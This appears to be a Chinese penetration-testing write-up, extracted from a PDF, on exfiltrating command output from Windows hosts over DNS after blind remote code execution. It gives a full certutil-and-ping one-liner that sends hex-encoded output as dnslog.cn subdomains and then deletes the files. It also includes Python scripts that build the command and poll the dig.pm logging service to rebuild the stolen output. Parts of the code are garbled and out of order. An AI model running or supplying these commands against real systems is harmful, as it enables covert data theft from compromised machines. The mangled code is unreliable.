Windows下DNS出⽹的命令回显技巧.md
2022/6/30
1 / 9
Windows下DNS出⽹的命令回显技巧
最近遇⻅了很多仅DNS出⽹的极限环境，简单研究了个还算通⽤的利⽤DNSLog的回显Trick，全当抛砖引
⽟，不喜勿喷。
0x00 前⾔
在实战中，命令执⾏总能遇⻅各种各样的环境，⽆回显且仅DNS出⽹的环境也能占个⼤多数。仅DNS出⽹的
环境⼀般利⽤编码+DNSLog就可以解决回显问题。
通⽤指的是在server2003（⽆powershell）环境也能⽤。
windows⾃带的encode只有certutil
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
2 / 9
certutil⾃带了base64和hex两种encode⽅法
0x01 base64-encode存在的问题
特殊字符。+，/ （⽆powershell环境处理替换⾮常麻烦）
单⾏⻓度。dns域名⻓度限制63个。certutil-encode后单⾏字符⻓度为64，需要将⼀⾏分割为两段带
出。（⽆powershell需要cmdshell套⽤循环操作，⼗分繁琐）
云服务器DNS问题
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
3 / 9
腾讯云的DNS服务器存在强转⼩写问题，⼿头没阿⾥服务器，不过测试了阿⾥的DNS（223.5.5.5）也存在
⼀样的问题。
以上原因在我研究的时候，最终放弃了base64-encode的⽅案。（尤其是最后⼀条强转⼩写的问题）
0x02 hex-encode⽅案
先看encode结果。
对⽐base64的，主要优点：
⽆特殊字符。
单⾏⻓度为32字符。
⽆需考虑⼤⼩写。
⽆需考虑不同条数数据外带存在延时。（外带记录会带出前4位表示数据位置的字符：0000）
但是⼀次dns只能带出来16个字符回显，效率有点低。
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
4 / 9
接下来只需要利⽤cmdshell语法，将中间的字符取出来即可。
for /f "tokens=1-17" %a in (result.txt) do echo 
%a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q 
在encode的最后⼀⾏可能因为字符不⾜导致存在特殊字符：
在写⼊的命令txt后追加部分字符后再encode即可解决此问题。
just like:
ipconfig > ipconfig &&echo 11111111111>>ipconfig 
最后⼀⾏DNSLog记录会以0d0a3131结尾，很容易判断了。
最终命令:
command > command &&echo 11111111111>>command && certutil -encodehex 
command command.txt && for /f "tokens=1-17" %a in (command.txt) do start 
/b ping -nc 1 %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.dnslog.cn && del 
command && del command.txt  
0x03 ⾃动化⻝⽤
因为外带的数据条数实在太⼤，就顺便⾃动化下。
⼀个⽣成命令，另⼀个脚本⽤来监听dnslog平台并做格式化输出
CommandGen.py
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
5 / 9
import sys 
commandTem = r'command > command7 &&echo 11111111111>>command7 && certutil 
-encodehex command7 command7.txt && for /f "tokens=1-17" %a in 
(command7.txt) do start /b ping -nc 1 
%a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.{0} && del command7 && del 
command7.txt'
with open('config617', 'r') as f: 
    command = commandTem.format(f.readlines()[0]) 
if __name__ == '__main__': 
    if len(sys.argv) list: 
    if commandStartPos and commandEndFlag:  
        commandHex[commandName].extend([result[length-1][1]['subdomain']  
                                        for length in 
range(len(result),commandStartPos,-1)  
                                        if result[length-1][1]
['subdomain'].count('.') == 7]) 
                                        # Get the command part of the 
DNSLog data 
        tempList = [] 
        for length in range(commandStartPos,-1,-1): 
            if result[length-1][1]['time'] < lastFinishTime:break 
            if result[length-1][1]['subdomain'].count('.') == 7: 
                tempList.append(result[length-1][1]['subdomain'])  
        commandHex[commandName].extend(tempList) 
        return commandHex[commandName] 
# deal with DNSlog data, Format the output
def deal_data(data: list): 
    global finishOnce 
    if commandStartPos and commandEndFlag: 
        for length in range(commandStartPos,-1,-1): 
            if result[length-1][1]['time'] < lastFinishTime:break 
            if result[length-1][1]['subdomain'].count('.') == 7: 
                commandHex[commandName].append(result[length-1][1]
['subdomain']) 
        try: 
            hexCommand = { item[:4] : item[4:] for item in 
commandHex[commandName] }  
            hexCommand = sorted(hexCommand.items(), key=lambda x: 
int(x[0], 16)) 
            hexCommand = [ item[1][:32] for item in hexCommand] 
        except: 
            print('!!!!Error Command format! Try to find DNSLog 
site(http://dig.pm/get_results) to get conntent..') 
            pass 
        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1]) 
        commandResult = ''.join(hexCommand) 
        #print(commandResult) 
        print('\n----Command Result----') 
        Head = '\033[36m' 
        End = '\033[0m' 
        try: 
            print(Head + binascii.a2b_hex(commandResult).decode('gb2312') 
+ End) 
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
7 / 9
        except: 
            print('Maybe use START to execute commands and cause DNSLog 
records to be lost..\nIt is recommended to remove START from the command') 
        print('----Get Result End!----') 
        finishOnce = True 
if __name__ == '__main__': 
    get_new_config() 
    while True: 
        if finishOnce:    
            get_new_config() 
        for i in range(requestTime,-1,-1): 
            print('\r', 'Wait DNSLog data: {}s...'.format(str(i)), end='')  
            time.sleep(1)    
        try: 
            data = { 'domain':domain, 'token':token } 
            url = 'http://dig.pm/get_results' 
            #proxies = { 'http':'http://127.0.0.1:8080' } 
            result = json.loads(requests.post(url, data=data, 
proxies=False).text)  
            result = sorted(result.items(), key=lambda x: int(x[0])) 
        except: 
            print('\r', 'Not Find DNSLog Result!', end='') 
            continue 
        commandStartFlag = 1 if lastRecordLen == len(result) else 0 
        lastRecordLen = len(result) 
        commandEndFlag = 1 if commandEndPos == len(result) else 0  
        commandEndPos = len(result) 
        if not commandStartPos and ((result[-1][1]
['subdomain'].count('.'))  == 7 or  
                                    commandStartFlag):  
                                    # judge if the DNSLog recording is 
start 
            if result[-1][1]['time'] < lastFinishTime:  
                print('\r', 'Not Find DNSLog Result!', end='') 
                continue                      
            commandStartPos = len(result) 
            commandName = result[-1][1]['subdomain'].split('.')[1] 
            print('\nFinding Command Record!') 
            print('----Command: \033[36m{}\033[0m----
'.format(commandName)) 
            commandHex[commandName] = []  
            print('Waiting Command DNSLog Record Finish...')    
        if commandStartPos and ((result[-1][1]['subdomain'].count('.')) != 
7 or  
                                commandEndFlag): 
                                # judge if the DNSLog recording is over 
            commandEndFlag = 1 
            #print('Command DNSLog Record Finish...')    
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
8 / 9
⽤法：
先运⾏hexDnsEcho.py，然后运⾏CommandGen.py⽣成命令，将⽣成的命令填写进⼊RCE点即可。
最终效果
        dataList = get_dnslogdata() 
        deal_data(dataList) 
Windows下DNS出⽹的命令回显技巧.md
2022/6/30
9 / 9
0x04 后续
研究这个trick还是花了⼏天时间的，主要是windows的cmd的实现的操作实在是有限，爬了好⼏天的论坛，
要是有师傅们有更好的⽅法和思路可以再研究交流⼀波。
本⽂全当抛砖引⽟，代码也是随⼿写的，质量不⾼，不喜勿喷，有问题也欢迎各位师傅指出。
最后吐槽⼀下我⽤的这个DNSLog平台的逆天排序
参考链接：http://www.bathome.net